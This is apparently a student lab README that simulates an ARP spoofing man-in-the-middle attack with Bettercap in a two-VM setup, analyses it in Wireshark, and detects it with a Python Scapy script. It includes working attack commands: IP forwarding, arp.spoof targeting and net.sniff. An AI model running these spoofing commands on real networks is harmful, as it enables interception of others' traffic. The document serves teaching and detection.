# 🔐 ARP Spoofing Man-in-the-Middle (MITM) Simulation & Detection

> **Project Type**: Cybersecurity Lab  
> **Environment**: 2 Virtual Machines (Kali Linux + Ubuntu/Windows)  
> **Goal**: Simulate an ARP Spoofing MITM attack, analyze it with Wireshark, and detect it using Python with Scrapy.

---

## 📌 Lab Setup

| Role        | VM OS        | IP Example        | Notes                     |
|-------------|--------------|-------------------|---------------------------|
| Attacker    | Kali Linux   | `192.168.219.134`  | Runs Bettercap            |
| Victim      | Ubuntu | `192.168.219.133`  | Runs Wireshark + Python |

---

## 🧰 Tools Required

| Tool         | Machine      | Purpose                            |
|--------------|--------------|------------------------------------|
| Bettercap    | Kali         | Perform ARP Spoofing + MITM attack |
| Wireshark    | Victim       | Analyze suspicious packets         |
| Python     | Victim       | Detect ARP spoofing (Spoofing alerts)   |

---

## ⚙️ Tool Installation

### ✅ On Kali (Attacker)
```bash
sudo apt update
sudo apt install bettercap -y
```
### ✅ On Ubuntu (Victim)
```bash
sudo apt update
sudo apt install wireshark -y
```

⚠️ During Wireshark install, select "NO" to prevent non-root users from capturing packets.

---

## 🚀 Step-by-Step MITM Attack Simulation
### ✅ Step 1: Check IP Addresses (on both VMs)
```bash
ip a
```
📸 Screenshot: 

<img width="657" alt="Screenshot 2025-05-26 at 10 37 13 PM" src="https://github.com/user-attachments/assets/f1723f20-2822-4c3b-82c7-ad7f909878a6" />
<img width="657" alt="Screenshot 2025-05-26 at 10 37 48 PM" src="https://github.com/user-attachments/assets/426d1557-dec6-4e2d-9616-cd7b545ff93d" />


📝 Confirm both machines are on the same subnet (e.g., 192.168.219.133/24)

### ✅ Step 2: Enable IP Forwarding on Kali
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```
### ✅ Step 3: Launch Bettercap on Kali
```bash
sudo bettercap -iface eth0
```
Use your network interface name (ip a to confirm — may be eth0 or ens33)
Inside Bettercap shell:
```bash
net.recon on
net.probe on
set arp.spoof.targets 192.168.219.133
set arp.spoof.internal true
arp.spoof on
net.sniff on
```
If Bettercap doesn't find the victim ip in the ARP Table, then do this in kali:
```bash
sudo arping -c 3 192.168.219.133
```
📸 Screenshot: 

<img width="657" alt="Screenshot 2025-05-26 at 10 58 07 PM" src="https://github.com/user-attachments/assets/de473561-c846-4deb-97fc-a63f094083ff" />

## 🧪 Packet Analysis using Wireshark
### ✅ Step 1: Start Wireshark (on Victim)
- Open Wireshark

- Select your active interface (eth0 or ens33)

- Start capturing

### ✅ Step 2: Apply Filters
ARP Filter
```wireshark
arp
```
🔍 Look for:

- Multiple ARP replies without corresponding requests

- One IP mapping to multiple MACs

- Multiple IP are mapping into same MACs

📸 Screenshot:
We can see that an ARP queries are broadcast.

<img width="1213" alt="Screenshot 2025-05-26 at 11 36 29 PM" src="https://github.com/user-attachments/assets/4031d5ff-5039-451d-9a03-d6bbbb45f953" />

And we can also see in the reply that the MAC assigned with the reply is the MAC address of the attacker.

<img width="1213" alt="Screenshot 2025-05-26 at 11 38 20 PM" src="https://github.com/user-attachments/assets/613ab99b-c201-46a1-a339-a6a5ff9ff2e0" />
<img width="1213" alt="Screenshot 2025-05-26 at 11 40 16 PM" src="https://github.com/user-attachments/assets/e88a02e5-42f7-4cc7-bd88-e696f270677b" />


Multiple IPs (e.g., 192.168.219.146, 192.168.219.147, 192.168.219.158, etc.)

All are resolving to the same MAC address (00:0c:29:8f:b2:51)

This is classic ARP spoofing, where an attacker poisons the ARP cache by sending unsolicited ARP replies, claiming ownership of multiple IP addresses using their own MAC. It allows interception or disruption of traffic meant for others.

---
## 🛡️ Live Detection Using Python
```python
from scapy.all import sniff, ARP
from collections import defaultdict

# Store MAC to IP mappings
mac_ip_map = defaultdict(set)

# Threshold for suspicious MAC claiming too many IPs
THRESHOLD = 3

def process_packet(packet):
    if packet.haslayer(ARP) and packet[ARP].op == 2:  # ARP reply
        ip = packet[ARP].psrc
        mac = packet[ARP].hwsrc

        mac_ip_map[mac].add(ip)

        print(f"[+] ARP Reply: {ip} is at {mac}")
        
        if len(mac_ip_map[mac]) >= THRESHOLD:
            print("⚠️  Suspicious Activity Detected!")
            print(f"    >> MAC {mac} is claiming {len(mac_ip_map[mac])} different IPs:")
            for claimed_ip in mac_ip_map[mac]:
                print(f"       - {claimed_ip}")
            print("-" * 40)

print("📡 Listening for ARP replies... (Press Ctrl+C to stop)\n")
sniff(filter="arp", prn=process_packet, store=0)
```
✅ How to Run:
```bash
sudo python3 detection.py
```
<img width="822" alt="Screenshot 2025-05-27 at 12 11 57 AM" src="https://github.com/user-attachments/assets/b8e58d80-1e26-4ae5-9f1d-1ffc35c9b1de" />

---

## ⚠️ Legal Disclaimer
This project is intended for educational use only in isolated, controlled lab environments. Never attempt MITM attacks or any unauthorized access on real or production networks.

---


# 👨‍💻 Author
```Mohtashim Haider,```

```Batch-4, Professional Master's in Information and Cyber Security,```

```University of Dhaka```





